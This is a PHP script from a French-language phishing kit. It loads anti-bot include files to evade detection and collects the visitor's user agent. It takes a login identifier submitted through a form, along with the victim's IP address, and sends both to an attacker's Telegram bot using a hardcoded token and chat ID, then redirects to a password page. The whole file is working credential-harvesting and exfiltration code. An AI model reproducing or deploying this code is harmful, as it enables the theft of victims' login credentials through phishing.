<?php

include '../src/antibots.php';
include '../antibots.php';
include '../anti/anti1.php';
include '../anti/anti2.php';
include '../anti/anti3.php';
include '../anti/anti4.php';
include '../anti/anti5.php';
include '../anti/anti6.php';
include '../anti/anti7.php';
include '../anti/anti8.php';
if (!isset($_SESSION['useragent'])) {
    $_SESSION['useragent'] = $_SERVER['HTTP_USER_AGENT']; // Stockez l'agent utilisateur dans la session
}


function getOs($USER_AGENT){
	$OS_ERROR    =   "Unknown OS Platform";
    $OS  =   array( '/windows nt 10/i'      =>  'Windows 10',
	                '/windows nt 6.3/i'     =>  'Windows 8.1',
	                '/windows nt 6.2/i'     =>  'Windows 8',
	                '/windows nt 6.1/i'     =>  'Windows 7',
	                '/windows nt 6.0/i'     =>  'Windows Vista',
	                '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
	                '/windows nt 5.1/i'     =>  'Windows XP',
	                '/windows xp/i'         =>  'Windows XP',
	                '/windows nt 5.0/i'     =>  'Windows 2000',
	                '/windows me/i'         =>  'Windows ME',
	                '/win98/i'              =>  'Windows 98',
	                '/win95/i'              =>  'Windows 95',
	                '/win16/i'              =>  'Windows 3.11',
	                '/macintosh|mac os x/i' =>  'Mac OS X',
	                '/mac_powerpc/i'        =>  'Mac OS 9',
	                '/linux/i'              =>  'Linux',
	                '/ubuntu/i'             =>  'Ubuntu',
	                '/iphone/i'             =>  'iPhone',
	                '/ipod/i'               =>  'iPod',
	                '/ipad/i'               =>  'iPad',
	                '/android/i'            =>  'Android',
	                '/blackberry/i'         =>  'BlackBerry',
	                '/webos/i'              =>  'Mobile');
    foreach ($OS as $regex => $value) { 
        if (preg_match($regex, $USER_AGENT)) {
            $OS_ERROR = $value;
        }

    }   
    return $OS_ERROR;
}
function getBrowser($USER_AGENT){
	$BROWSER_ERROR    =   "Unknown Browser";
    $BROWSER  =   array('/msie/i'       =>  'Internet Explorer',
                        '/firefox/i'    =>  'Firefox',
                        '/safari/i'     =>  'Safari',
                        '/chrome/i'     =>  'Chrome',
                        '/edge/i'       =>  'Edge',
                        '/opera/i'      =>  'Opera',
                        '/netscape/i'   =>  'Netscape',
                        '/maxthon/i'    =>  'Maxthon',
                        '/konqueror/i'  =>  'Konqueror',
                        '/mobile/i'     =>  'Handheld Browser');
    foreach ($BROWSER as $regex => $value) { 
        if (preg_match($regex, $USER_AGENT)) {
            $BROWSER_ERROR = $value;
        }
    }
    return $BROWSER_ERROR;
}
// Récupération des données envoyées via POST
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $userInput = htmlspecialchars($_POST['userInput']);
    $ip = $_SERVER['REMOTE_ADDR'];

    // Vérification si le champ est vide
    if (empty($userInput)) {
        die('Identifiant non fourni.');
    }

    // Configuration Telegram
    $telegramBotToken = '8013840116:AAGh5D3KdwSRvjBd5q-oSYcio0PHoDhCazQ'; // Remplacez par le token de votre bot Telegram
    $chatID = '-4639401211'; // Remplacez par l'ID de votre chat ou groupe Telegram

    // Message formaté
    $message = "<b>🔐 Nouveau identifiant reçu :</b>\n\n";
    $message .= "<b>🆔 Identifiant :</b> <code>" . $userInput . "</code>\n";
    $message .= "<b>🌐 IP :</b> <code>" . $ip . "</code>";

    // URL de l'API Telegram
    $telegramAPI = "https://api.telegram.org/bot{$telegramBotToken}/sendMessage";

    // Configuration des données à envoyer
    $postData = [
        'chat_id' => $chatID,
        'text' => $message,
        'parse_mode' => 'HTML' // Permet d'utiliser les balises <b> et <code>
    ];

    // Envoi de la requête
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $telegramAPI);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // À éviter en production

    $response = curl_exec($ch);

    if (curl_errno($ch)) {
        echo 'Erreur de connexion à Telegram : ' . curl_error($ch);
    } else {
        header("Location: ../password.php");
        exit;
    }
}
?>
